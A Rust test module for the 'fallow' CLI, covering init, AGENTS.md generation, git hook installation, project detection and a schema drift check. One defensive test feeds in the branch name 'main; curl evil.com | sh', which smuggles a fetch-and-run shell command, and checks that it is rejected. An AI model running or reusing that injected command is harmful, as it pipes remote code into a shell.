        std::fs::write(root.join(".fallowrc.json"), "{}").unwrap();
        assert_eq!(run_init(&config_opts(root, false)), ExitCode::from(2));
        assert_eq!(run_init(&config_opts(root, true)), ExitCode::from(2));
    }

    #[test]
    fn init_agents_creates_agents_guide() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let exit = run_init(&agents_opts(root));
        assert_eq!(exit, ExitCode::SUCCESS);
        let path = root.join("AGENTS.md");
        assert!(path.exists());
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.contains("# AGENTS.md"));
        assert!(content.contains("Project Overview"));
        assert!(content.contains("fallow audit --format json --quiet"));
        assert!(!root.join(".fallowrc.json").exists());
        assert!(!root.join("fallow.toml").exists());
    }

    #[test]
    fn init_agents_refuses_to_overwrite_existing_guide() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join("AGENTS.md"), "# Existing guide\n").unwrap();
        let exit = run_init(&agents_opts(root));
        assert_eq!(exit, ExitCode::from(2));
        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
        assert_eq!(content, "# Existing guide\n");
    }

    #[test]
    fn init_agents_template_is_not_a_readiness_score() {
        // Static template baseline.
        let template = AGENTS_GUIDE_TEMPLATE.to_lowercase();
        assert!(!template.contains("readiness"));
        assert!(!template.contains("score"));
        assert!(!template.contains("grade"));

        // Fully-prefilled output (fixture 1 equivalent).
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(
            root.join("pnpm-workspace.yaml"),
            "packages:\n  - 'packages/*'\n",
        )
        .unwrap();
        std::fs::write(root.join("tsconfig.json"), "{}").unwrap();
        std::fs::write(
            root.join("package.json"),
            r#"{"devDependencies": {"vitest": "^1"}}"#,
        )
        .unwrap();
        let info = detect_project(root);
        let generated = build_agents_guide(&info).to_lowercase();
        assert!(!generated.contains("readiness"));
        assert!(!generated.contains("score"));
        assert!(!generated.contains("grade"));

        // Empty-project output (fixture 4 equivalent).
        let empty_info = ProjectInfo {
            is_monorepo: false,
            workspace_patterns: Vec::new(),
            workspace_tool: None,
            has_typescript: false,
            test_framework: None,
            ui_framework: None,
            has_storybook: false,
            package_manager: None,
            test_framework_ambiguous: false,
        };
        let empty_generated = build_agents_guide(&empty_info).to_lowercase();
        assert!(!empty_generated.contains("readiness"));
        assert!(!empty_generated.contains("score"));
        assert!(!empty_generated.contains("grade"));
    }

    #[test]
    fn agents_guide_prefills_monorepo_pnpm_vitest() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(
            root.join("pnpm-workspace.yaml"),
            "packages:\n  - 'packages/*'\n",
        )
        .unwrap();
        std::fs::write(root.join("tsconfig.json"), "{}").unwrap();
        std::fs::write(
            root.join("package.json"),
            r#"{"devDependencies": {"vitest": "^1"}}"#,
        )
        .unwrap();

        let exit = run_init(&agents_opts(root));
        assert_eq!(exit, ExitCode::SUCCESS);
        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();

        assert!(content.contains("- Install: pnpm install"), "Install line");
        assert!(content.contains("- Test: Vitest"), "Test line");
        assert!(
            content.contains("- Typecheck or lint: tsc --noEmit"),
            "Typecheck line"
        );
        assert!(
            content.contains("- Module boundaries: pnpm workspaces (packages/*)"),
            "Module boundaries line"
        );
        assert!(
            content.contains(
                "<!-- fallow init prefilled these from package.json; confirm before relying on them -->"
            ),
            "Provenance comment"
        );
        // Primary app stays blank.
        assert!(
            content.contains("- Primary app or package:"),
            "Primary app blank"
        );
        let primary_line = content
            .lines()
            .find(|l| l.contains("Primary app or package:"))
            .unwrap();
        assert_eq!(
            primary_line.trim(),
            "- Primary app or package:",
            "Primary app line must have nothing after the colon"
        );
        // No UI framework or Storybook lines.
        assert!(!content.contains("UI framework"), "No UI framework line");
        assert!(!content.contains("Storybook"), "No Storybook line");
    }

    #[test]
    fn agents_guide_respects_package_manager_field() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(
            root.join("package.json"),
            r#"{"packageManager": "yarn@4.1.0"}"#,
        )
        .unwrap();

        let exit = run_init(&agents_opts(root));
        assert_eq!(exit, ExitCode::SUCCESS);
        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
        assert!(
            content.contains("- Install: yarn install"),
            "yarn from packageManager field"
        );
    }

    #[test]
    fn agents_guide_ambiguous_test_framework_stays_blank() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(
            root.join("package.json"),
            r#"{"devDependencies": {"vitest": "^1", "jest": "^29"}}"#,
        )
        .unwrap();

        let exit = run_init(&agents_opts(root));
        assert_eq!(exit, ExitCode::SUCCESS);
        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
        // Test line must be blank (just "- Test:" with nothing after the colon).
        let test_line = content
            .lines()
            .find(|l| l.trim_start().starts_with("- Test:"))
            .expect("- Test: line should be present");
        assert_eq!(
            test_line.trim(),
            "- Test:",
            "Ambiguous test framework must leave - Test: blank"
        );
    }

    #[test]
    fn agents_guide_bun_workspace_stays_tool_neutral() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // Bun-shaped workspace: package.json `workspaces` + bun.lock, no
        // packageManager field, no pnpm-workspace.yaml. workspace_tool falls
        // back to "npm", which must NOT leak into the scaffold.
        std::fs::write(
            root.join("package.json"),
            r#"{"workspaces": ["packages/*"]}"#,
        )
        .unwrap();
        std::fs::write(root.join("bun.lock"), "{}").unwrap();

        let exit = run_init(&agents_opts(root));
        assert_eq!(exit, ExitCode::SUCCESS);
        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
        assert!(
            content.contains("- Module boundaries: workspaces (packages/*)"),
            "tool-neutral boundaries label, got: {content}"
        );
        assert!(
            !content.contains("npm workspaces"),
            "lockfile-default npm label must not appear"
        );
    }

    #[test]
    fn agents_guide_package_manager_labels_boundaries() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(
            root.join("package.json"),
            r#"{"workspaces": ["packages/*"], "packageManager": "bun@1.2.0"}"#,
        )
        .unwrap();

        let exit = run_init(&agents_opts(root));
        assert_eq!(exit, ExitCode::SUCCESS);
        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
        assert!(
            content.contains("- Module boundaries: bun workspaces (packages/*)"),
            "packageManager field labels boundaries, got: {content}"
        );
        assert!(content.contains("- Install: bun install"), "Install line");
    }

    #[test]
    fn agents_guide_empty_project_keeps_placeholders() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        // Empty fixture: no files at all.
        let exit = run_init(&agents_opts(root));
        assert_eq!(exit, ExitCode::SUCCESS);
        let content = std::fs::read_to_string(root.join("AGENTS.md")).unwrap();
        // Must be byte-identical to the static template.
        assert_eq!(
            content, AGENTS_GUIDE_TEMPLATE,
            "Empty-project output must be byte-identical to the static AGENTS_GUIDE_TEMPLATE"
        );
        // No provenance comment when nothing was prefilled.
        assert!(
            !content.contains("fallow init prefilled"),
            "No provenance comment for empty project"
        );
    }

    #[test]
    fn detect_test_framework_ambiguous_vitest_and_jest() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"devDependencies": {"vitest": "^1", "jest": "^29"}}"#,
        )
        .unwrap();
        let info = detect_project(dir.path());
        assert!(
            info.test_framework_ambiguous,
            "both vitest and jest present => ambiguous"
        );
        // test_framework still holds the first-match value.
        assert_eq!(info.test_framework.as_deref(), Some("Vitest"));
    }

    #[test]
    fn detect_package_manager_field() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"packageManager": "pnpm@9.0.0"}"#,
        )
        .unwrap();
        let info = detect_project(dir.path());
        assert_eq!(
            info.package_manager.as_deref(),
            Some("pnpm"),
            "packageManager parsed to just the manager name"
        );
    }

    #[test]
    fn hooks_fails_without_git_dir() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        let exit = run_init(&hooks_opts(root, None));
        assert_eq!(exit, ExitCode::from(2));
    }

    #[test]
    fn hooks_creates_git_hook() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        let exit = run_init(&hooks_opts(root, None));
        assert_eq!(exit, ExitCode::SUCCESS);
        let hook_path = root.join(".git/hooks/pre-commit");
        assert!(hook_path.exists());
        let content = std::fs::read_to_string(&hook_path).unwrap();
        assert!(content.contains("fallow audit"));
        assert!(content.contains("fallow audit --base \"$BASE\" --quiet"));
        assert!(content.contains(GIT_HOOK_MARKER));
        assert!(content.contains("@{upstream}"));
        assert!(content.contains("git merge-base \"$UPSTREAM\" HEAD"));
        assert!(content.contains("BASE=\"main\""));
        assert!(content.contains("command -v fallow"));
        assert!(content.contains("gate=new-only"));
        assert!(content.contains("\n  BASE=\""));
    }

    #[test]
    fn hooks_uses_custom_branch_ref() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        let exit = run_init(&hooks_opts(root, Some("develop")));
        assert_eq!(exit, ExitCode::SUCCESS);
        let content = std::fs::read_to_string(root.join(".git/hooks/pre-commit")).unwrap();
        assert!(content.contains("BASE=\"develop\""));
        assert!(!content.contains("--base develop"));
        assert!(content.contains("fallow audit --base \"$BASE\" --quiet"));
    }

    #[test]
    fn hooks_prefers_husky() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".husky")).unwrap();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        let exit = run_init(&hooks_opts(root, None));
        assert_eq!(exit, ExitCode::SUCCESS);
        let husky_hook = root.join(".husky/pre-commit");
        assert!(husky_hook.exists());
        assert!(!root.join(".git/hooks/pre-commit").exists());
        let content = std::fs::read_to_string(&husky_hook).unwrap();
        assert!(content.contains(GIT_HOOK_MARKER));
        assert!(content.contains("@{upstream}"));
        assert!(content.contains("git merge-base \"$UPSTREAM\" HEAD"));
        assert!(content.contains("fallow audit --base \"$BASE\" --quiet"));
    }

    #[test]
    fn hooks_fails_if_hook_already_exists() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        std::fs::write(root.join(".git/hooks/pre-commit"), "#!/bin/sh\n").unwrap();
        let exit = run_init(&hooks_opts(root, None));
        assert_eq!(exit, ExitCode::from(2));
    }

    #[test]
    fn existing_hook_hint_includes_resolution_block() {
        let hint = existing_hook_hint(".git/hooks/pre-commit", "main");
        assert!(hint.contains(".git/hooks/pre-commit already exists"));
        assert!(hint.contains("command -v fallow"));
        assert!(hint.contains("@{upstream}"));
        assert!(hint.contains("git merge-base \"$UPSTREAM\" HEAD"));
        assert!(hint.contains("BASE=\"main\""));
        assert!(hint.contains("fallow audit --base \"$BASE\" --quiet"));
    }

    #[test]
    fn lefthook_hint_includes_resolution_block() {
        let hint = lefthook_hint("develop");
        assert!(hint.contains("Lefthook detected"));
        assert!(hint.contains("pre-commit:"));
        assert!(hint.contains("run: |"));
        assert!(hint.contains("@{upstream}"));
        assert!(hint.contains("git merge-base \"$UPSTREAM\" HEAD"));
        assert!(hint.contains("BASE=\"develop\""));
        assert!(hint.contains("fallow audit --base \"$BASE\" --quiet"));
    }

    #[test]
    fn git_hooks_uninstall_removes_managed_hook() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        assert_eq!(
            run_git_hooks_install(&GitHooksInstallOptions {
                root,
                branch: None,
                dry_run: false,
                force: false,
            }),
            ExitCode::SUCCESS
        );

        let hook_path = root.join(".git/hooks/pre-commit");
        assert!(hook_path.exists());
        assert_eq!(
            run_git_hooks_uninstall(&GitHooksUninstallOptions {
                root,
                dry_run: false,
                force: false,
            }),
            ExitCode::SUCCESS
        );
        assert!(!hook_path.exists());
    }

    #[test]
    fn git_hooks_uninstall_preserves_user_hook_without_force() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        let hook_path = root.join(".git/hooks/pre-commit");
        std::fs::write(&hook_path, "#!/bin/sh\necho user\n").unwrap();

        assert_eq!(
            run_git_hooks_uninstall(&GitHooksUninstallOptions {
                root,
                dry_run: false,
                force: false,
            }),
            ExitCode::from(2)
        );
        assert!(hook_path.exists());
    }

    #[test]
    fn git_hooks_uninstall_force_removes_user_hook() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        let hook_path = root.join(".git/hooks/pre-commit");
        std::fs::write(&hook_path, "#!/bin/sh\necho user\n").unwrap();

        assert_eq!(
            run_git_hooks_uninstall(&GitHooksUninstallOptions {
                root,
                dry_run: false,
                force: true,
            }),
            ExitCode::SUCCESS
        );
        assert!(!hook_path.exists());
    }

    #[test]
    fn hooks_detects_lefthook() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join("lefthook.yml"), "").unwrap();
        let exit = run_init(&hooks_opts(root, None));
        assert_eq!(exit, ExitCode::SUCCESS);
    }

    #[cfg(unix)]
    #[test]
    fn hooks_file_is_executable() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        run_init(&hooks_opts(root, None));
        let meta = std::fs::metadata(root.join(".git/hooks/pre-commit")).unwrap();
        let mode = meta.permissions().mode();
        assert!(
            mode & 0o111 != 0,
            "hook should be executable, mode={mode:o}"
        );
    }

    #[test]
    fn hooks_rejects_malicious_branch_ref() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        let exit = run_init(&hooks_opts(root, Some("main; curl evil.com | sh")));
        assert_eq!(exit, ExitCode::from(2));
        assert!(!root.join(".git/hooks/pre-commit").exists());
    }

    #[test]
    fn init_creates_gitignore_with_fallow_entry() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        run_init(&config_opts(root, false));
        let content = std::fs::read_to_string(root.join(".gitignore")).unwrap();
        assert!(content.contains(".fallow/"));
    }

    #[test]
    fn init_appends_to_existing_gitignore() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join(".gitignore"), "node_modules/\n").unwrap();
        run_init(&config_opts(root, false));
        let content = std::fs::read_to_string(root.join(".gitignore")).unwrap();
        assert!(content.starts_with("node_modules/\n"));
        assert!(content.contains(".fallow/"));
    }

    #[test]
    fn init_does_not_duplicate_gitignore_entry() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join(".gitignore"), "node_modules/\n.fallow/\n").unwrap();
        run_init(&config_opts(root, false));
        let content = std::fs::read_to_string(root.join(".gitignore")).unwrap();
        assert_eq!(content.matches(".fallow").count(), 1);
    }

    #[test]
    fn init_recognizes_fallow_without_trailing_slash() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join(".gitignore"), ".fallow\n").unwrap();
        run_init(&config_opts(root, false));
        let content = std::fs::read_to_string(root.join(".gitignore")).unwrap();
        assert_eq!(content.matches(".fallow").count(), 1);
    }

    #[test]
    fn init_appends_newline_to_gitignore_without_trailing_newline() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(root.join(".gitignore"), "node_modules/").unwrap();
        run_init(&config_opts(root, false));
        let content = std::fs::read_to_string(root.join(".gitignore")).unwrap();
        assert_eq!(content, "node_modules/\n.fallow/\n");
    }

    #[test]
    fn init_toml_also_updates_gitignore() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        run_init(&config_opts(root, true));
        let content = std::fs::read_to_string(root.join(".gitignore")).unwrap();
        assert!(content.contains(".fallow/"));
    }

    #[test]
    fn detect_empty_project() {
        let dir = tempfile::tempdir().unwrap();
        let info = detect_project(dir.path());
        assert!(!info.is_monorepo);
        assert!(!info.has_typescript);
        assert!(!info.has_storybook);
        assert!(info.workspace_tool.is_none());
        assert!(info.test_framework.is_none());
        assert!(info.ui_framework.is_none());
    }

    #[test]
    fn detect_typescript_project() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("tsconfig.json"), "{}").unwrap();
        let info = detect_project(dir.path());
        assert!(info.has_typescript);
    }

    #[test]
    fn detect_pnpm_monorepo() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("pnpm-workspace.yaml"),
            "packages:\n  - 'packages/*'\n",
        )
        .unwrap();
        let info = detect_project(dir.path());
        assert!(info.is_monorepo);
        assert_eq!(info.workspace_tool.as_deref(), Some("pnpm"));
        assert_eq!(info.workspace_patterns, vec!["packages/*"]);
    }

    #[test]
    fn detect_npm_workspaces() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"workspaces": ["packages/*", "apps/*"]}"#,
        )
        .unwrap();
        let info = detect_project(dir.path());
        assert!(info.is_monorepo);
        assert_eq!(info.workspace_tool.as_deref(), Some("npm"));
        assert_eq!(info.workspace_patterns, vec!["packages/*", "apps/*"]);
    }

    #[test]
    fn detect_yarn_workspaces() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"workspaces": ["packages/*"]}"#,
        )
        .unwrap();
        std::fs::write(dir.path().join("yarn.lock"), "").unwrap();
        let info = detect_project(dir.path());
        assert!(info.is_monorepo);
        assert_eq!(info.workspace_tool.as_deref(), Some("yarn"));
    }

    #[test]
    fn detect_react_vitest_storybook() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"devDependencies": {"vitest": "^1", "react": "^18"}}"#,
        )
        .unwrap();
        std::fs::create_dir_all(dir.path().join(".storybook")).unwrap();
        std::fs::write(dir.path().join("tsconfig.json"), "{}").unwrap();

        let info = detect_project(dir.path());
        assert!(info.has_typescript);
        assert!(info.has_storybook);
        assert_eq!(info.test_framework.as_deref(), Some("Vitest"));
        assert_eq!(info.ui_framework.as_deref(), Some("React"));
    }

    #[test]
    fn detect_jest() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"devDependencies": {"jest": "^29"}}"#,
        )
        .unwrap();
        let info = detect_project(dir.path());
        assert_eq!(info.test_framework.as_deref(), Some("Jest"));
    }

    #[test]
    fn detect_vue() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"dependencies": {"vue": "^3"}}"#,
        )
        .unwrap();
        let info = detect_project(dir.path());
        assert_eq!(info.ui_framework.as_deref(), Some("Vue"));
    }

    #[test]
    fn detect_angular() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"dependencies": {"@angular/core": "^17"}}"#,
        )
        .unwrap();
        let info = detect_project(dir.path());
        assert_eq!(info.ui_framework.as_deref(), Some("Angular"));
    }

    #[test]
    fn detect_svelte() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"devDependencies": {"svelte": "^4"}}"#,
        )
        .unwrap();
        let info = detect_project(dir.path());
        assert_eq!(info.ui_framework.as_deref(), Some("Svelte"));
    }

    #[test]
    fn detect_playwright() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("package.json"),
            r#"{"devDependencies": {"@playwright/test": "^1"}}"#,
        )
        .unwrap();
        let info = detect_project(dir.path());
        assert_eq!(info.test_framework.as_deref(), Some("Playwright"));
    }

    #[test]
    fn json_config_empty_project_is_valid() {
        let info = ProjectInfo {
            is_monorepo: false,
            workspace_patterns: Vec::new(),
            workspace_tool: None,
            has_typescript: false,
            test_framework: None,
            ui_framework: None,
            has_storybook: false,
            package_manager: None,
            test_framework_ambiguous: false,
        };
        let json = build_json_config(&info);
        let parsed = parse_jsonc_config(&json);
        assert!(parsed["$schema"].is_string());
        assert!(parsed["entry"].is_array());
        assert!(parsed["duplicates"].is_object());
        assert!(parsed["rules"].is_object());
        assert!(json.contains("{js,jsx,mjs}"));
    }

    #[test]
    fn json_config_typescript_uses_ts_extensions() {
        let info = ProjectInfo {
            is_monorepo: false,
            workspace_patterns: Vec::new(),
            workspace_tool: None,
            has_typescript: true,
            test_framework: None,
            ui_framework: None,
            has_storybook: false,
            package_manager: None,
            test_framework_ambiguous: false,
        };
        let json = build_json_config(&info);
        assert!(json.contains("{ts,tsx,js,jsx}"));
    }

    #[test]
    fn json_config_monorepo_includes_workspaces() {
        let info = ProjectInfo {
            is_monorepo: true,
            workspace_patterns: vec!["packages/*".to_string(), "apps/*".to_string()],
            workspace_tool: Some("pnpm".to_string()),
            has_typescript: true,
            test_framework: None,
            ui_framework: None,
            has_storybook: false,
            package_manager: None,
            test_framework_ambiguous: false,
        };
        let json = build_json_config(&info);
        let parsed = parse_jsonc_config(&json);
        assert!(parsed["workspaces"]["packages"].is_array());
        let packages = parsed["workspaces"]["packages"].as_array().unwrap();
        assert_eq!(packages.len(), 2);
    }

    #[test]
    fn json_config_storybook_adds_ignore() {
        let info = ProjectInfo {
            is_monorepo: false,
            workspace_patterns: Vec::new(),
            workspace_tool: None,
            has_typescript: true,
            test_framework: None,
            ui_framework: None,
            has_storybook: true,
            package_manager: None,
            test_framework_ambiguous: false,
        };
        let json = build_json_config(&info);
        let parsed = parse_jsonc_config(&json);
        let ignore = parsed["ignorePatterns"].as_array().unwrap();
        assert!(ignore.iter().any(|v| v == ".storybook/**"));
    }

    #[test]
    fn json_config_test_framework_adds_rule() {
        let info = ProjectInfo {
            is_monorepo: false,
            workspace_patterns: Vec::new(),
            workspace_tool: None,
            has_typescript: true,
            test_framework: Some("Vitest".to_string()),
            ui_framework: None,
            has_storybook: false,
            package_manager: None,
            test_framework_ambiguous: false,
        };
        let json = build_json_config(&info);
        let parsed = parse_jsonc_config(&json);
        assert_eq!(parsed["rules"]["unused-dependencies"], "warn");
    }

    #[test]
    fn toml_config_monorepo_includes_workspaces() {
        let info = ProjectInfo {
            is_monorepo: true,
            workspace_patterns: vec!["packages/*".to_string()],
            workspace_tool: Some("pnpm".to_string()),
            has_typescript: true,
            test_framework: None,
            ui_framework: None,
            has_storybook: false,
            package_manager: None,
            test_framework_ambiguous: false,
        };
        let toml = build_toml_config(&info);
        assert!(toml.contains("[workspaces]"));
        assert!(toml.contains("packages = [\"packages/*\"]"));
    }

    #[test]
    fn toml_config_storybook_adds_ignore() {
        let info = ProjectInfo {
            is_monorepo: false,
            workspace_patterns: Vec::new(),
            workspace_tool: None,
            has_typescript: false,
            test_framework: None,
            ui_framework: None,
            has_storybook: true,
            package_manager: None,
            test_framework_ambiguous: false,
        };
        let toml = build_toml_config(&info);
        assert!(toml.contains("ignorePatterns = [\".storybook/**\"]"));
        assert!(toml.contains("[duplicates]"));
        assert!(toml.contains("#   \"**/lib/**\""));
    }

    #[test]
    fn init_json_detects_monorepo_setup() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(
            root.join("package.json"),
            r#"{"workspaces": ["packages/*"]}"#,
        )
        .unwrap();
        std::fs::write(root.join("tsconfig.json"), "{}").unwrap();

        let exit = run_init(&config_opts(root, false));
        assert_eq!(exit, ExitCode::SUCCESS);

        let content = std::fs::read_to_string(root.join(".fallowrc.json")).unwrap();
        let parsed = parse_jsonc_config(&content);
        assert!(parsed["workspaces"]["packages"].is_array());
        assert!(content.contains("{ts,tsx,js,jsx}"));
    }

    #[test]
    fn init_toml_detects_monorepo_setup() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::write(
            root.join("pnpm-workspace.yaml"),
            "packages:\n  - 'apps/*'\n",
        )
        .unwrap();

        let exit = run_init(&config_opts(root, true));
        assert_eq!(exit, ExitCode::SUCCESS);

        let content = std::fs::read_to_string(root.join("fallow.toml")).unwrap();
        assert!(content.contains("[workspaces]"));
        assert!(content.contains("apps/*"));
    }
}

#[cfg(test)]
mod config_schema_drift {
    //! Drift gate for the committed root `schema.json` (the JSON Schema for
    //! `.fallowrc.json`). Mirrors the `docs/output-schema.json` drift gate in
    //! `crates/cli/src/bin/schema_emit.rs` but is much simpler because
    //! `schema.json` is fully derived from `FallowConfig::json_schema()` with
    //! no hand-written sections to merge: the committed file is the literal
    //! pretty-printed serde_json output of [`FallowConfig::json_schema`].
    //!
    //! On failure, regenerate via:
    //!   cargo run --bin fallow -- config-schema > schema.json
    //!
    //! The CI `rust:` paths-filter at `.github/workflows/ci.yml` also matches
    //! edits to `schema.json` directly, so a PR that only touches the
    //! committed schema still triggers this test rather than slipping through
    //! to a push-time failure on main.

    use super::FallowConfig;

    /// Embedded copy of the committed root `schema.json`. `include_str!`
    /// paths must resolve INSIDE the crates.io tarball, which contains only
    /// `crates/cli/`. The workspace root's `schema.json` is mirrored into
    /// `crates/cli/schema.json` via a git symlink; `cargo package`
    /// dereferences the symlink into a regular file inside the published
    /// tarball, so both local dev and the published crate stay
    /// self-contained. This mirrors the GitLab CI template bundling pattern
    /// in `crates/cli/src/ci_template.rs`. Contributors edit
    /// `<workspace>/schema.json` only; the symlink picks the new bytes up
    /// automatically.
    const COMMITTED: &str = include_str!("../schema.json");

    #[test]
    fn schema_json_in_sync_with_derived() {
        let derived = FallowConfig::json_schema();
        assert!(
            derived.is_object(),
            "FallowConfig::json_schema() did not produce a JSON object (got `{derived}`); \
             schemars or serde_json may have regressed."
        );

        let committed: serde_json::Value =
            serde_json::from_str(COMMITTED).expect("committed schema.json must parse as JSON");

        assert_eq!(
            committed, derived,
            "\nschema.json drift detected.\n\
             Regenerate: cargo run --bin fallow -- config-schema > schema.json\n\
             Usually triggered by edits to #[derive(JsonSchema)] structs or /// docstrings in crates/config/.\n"
        );
    }
}
